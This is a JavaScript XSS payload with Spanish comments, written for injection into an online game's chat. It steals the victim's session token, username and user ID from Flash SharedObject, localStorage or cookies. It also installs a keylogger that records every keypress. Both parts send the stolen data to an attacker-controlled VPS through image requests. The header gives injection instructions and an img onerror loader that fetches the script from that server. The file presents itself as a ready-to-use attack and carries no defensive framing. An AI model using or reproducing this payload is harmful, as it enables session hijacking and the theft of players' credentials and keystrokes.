/**
 * XSS Payload - COMBO (Session Stealer + Keylogger)
 *
 * Este payload ejecuta AMBOS ataques simultáneamente:
 * - Roba el token de sesión
 * - Captura todas las teclas presionadas
 *
 * INSTRUCCIONES:
 * 1. Reemplaza TU_VPS_IP con la IP de tu VPS
 * 2. Asegúrate de que AMBOS servidores estén corriendo (puertos 5000 y 6000)
 * 3. Inyecta este payload en el chat del juego
 *
 * EJEMPLO DE INYECCIÓN:
 * <img src=x onerror='var s=document.createElement("script");s.src="http://TU_VPS_IP:8000/combo.js";document.body.appendChild(s);'>
 */

(function() {
    'use strict';

    const VPS_IP = 'TU_VPS_IP';  // ← CAMBIAR ESTO
    const SESSION_PORT = 5000;
    const KEYLOGGER_PORT = 6000;

    console.log('[COMBO XSS] Iniciando ataque combinado...');

    // ==========================================
    // PARTE 1: ROBO DE SESIÓN
    // ==========================================
    (function stealSession() {
        try {
            var token = 'NO_TOKEN';
            var username = 'Unknown';
            var userId = 0;

            // Intentar SharedObject (Flash)
            try {
                if (typeof SharedObject !== 'undefined') {
                    var so = SharedObject.getLocal('userSession');
                    if (so && so.data) {
                        token = so.data.sessionToken || so.data.token || 'NO_TOKEN';
                        username = so.data.username || so.data.user || 'Unknown';
                        userId = so.data.userId || so.data.uid || 0;
                    }
                }
            } catch(e) {}

            // Fallback: localStorage
            if (token === 'NO_TOKEN') {
                try {
                    token = localStorage.getItem('sessionToken') || 'NO_TOKEN';
                    username = localStorage.getItem('username') || 'Unknown';
                    userId = localStorage.getItem('userId') || 0;
                } catch(e) {}
            }

            // Fallback: cookies
            if (token === 'NO_TOKEN') {
                try {
                    var cookies = document.cookie.split(';');
                    for (var i = 0; i < cookies.length; i++) {
                        var cookie = cookies[i].trim();
                        if (cookie.startsWith('sessionToken=')) {
                            token = cookie.split('=')[1];
                        }
                        if (cookie.startsWith('username=')) {
                            username = cookie.split('=')[1];
                        }
                    }
                } catch(e) {}
            }

            // Enviar token robado
            var url = 'http://' + VPS_IP + ':' + SESSION_PORT + '/steal' +
                      '?token=' + encodeURIComponent(token) +
                      '&user=' + encodeURIComponent(username) +
                      '&uid=' + userId;

            var img = new Image();
            img.src = url;

            console.log('[COMBO XSS] ✓ Token robado: ' + token.substring(0, 30) + '...');

        } catch(e) {
            console.error('[COMBO XSS] Error robando sesión:', e);
        }
    })();

    // ==========================================
    // PARTE 2: KEYLOGGER
    // ==========================================
    (function installKeylogger() {
        try {
            var keyBuffer = '';
            var username = 'Unknown';
            var lastSendTime = Date.now();
            const BUFFER_SIZE = 20;
            const SEND_INTERVAL = 5000;

            // Obtener username
            try {
                if (typeof SharedObject !== 'undefined') {
                    var so = SharedObject.getLocal('userSession');
                    if (so && so.data) {
                        username = so.data.username || so.data.user || 'Unknown';
                    }
                }
            } catch(e) {
                try {
                    username = localStorage.getItem('username') || 'Unknown';
                } catch(e2) {}
            }

            function sendKeys(data) {
                if (!data || data.length === 0) return;

                var url = 'http://' + VPS_IP + ':' + KEYLOGGER_PORT + '/keys' +
                          '?data=' + encodeURIComponent(data) +
                          '&user=' + encodeURIComponent(username);

                var img = new Image();
                img.src = url;
            }

            // Capturar keypress
            document.addEventListener('keypress', function(e) {
                try {
                    var char = String.fromCharCode(e.keyCode || e.which);
                    keyBuffer += char;

                    var now = Date.now();
                    if (keyBuffer.length >= BUFFER_SIZE || (now - lastSendTime) > SEND_INTERVAL) {
                        sendKeys(keyBuffer);
                        keyBuffer = '';
                        lastSendTime = now;
                    }
                } catch(err) {}
            }, true);

            // Capturar keydown para teclas especiales
            document.addEventListener('keydown', function(e) {
                try {
                    var specialKeys = {
                        8: '[BACKSPACE]',
                        9: '[TAB]',
                        13: '[ENTER]',
                        32: ' ',
                        46: '[DEL]'
                    };

                    if (specialKeys[e.keyCode]) {
                        keyBuffer += specialKeys[e.keyCode];

                        var now = Date.now();
                        if (keyBuffer.length >= BUFFER_SIZE || (now - lastSendTime) > SEND_INTERVAL) {
                            sendKeys(keyBuffer);
                            keyBuffer = '';
                            lastSendTime = now;
                        }
                    }
                } catch(err) {}
            }, true);

            // Enviar periódicamente
            setInterval(function() {
                if (keyBuffer.length > 0) {
                    sendKeys(keyBuffer);
                    keyBuffer = '';
                    lastSendTime = Date.now();
                }
            }, SEND_INTERVAL);

            console.log('[COMBO XSS] ✓ Keylogger instalado');

        } catch(e) {
            console.error('[COMBO XSS] Error instalando keylogger:', e);
        }
    })();

    console.log('[COMBO XSS] ✓ Ataque combinado completado');

})();
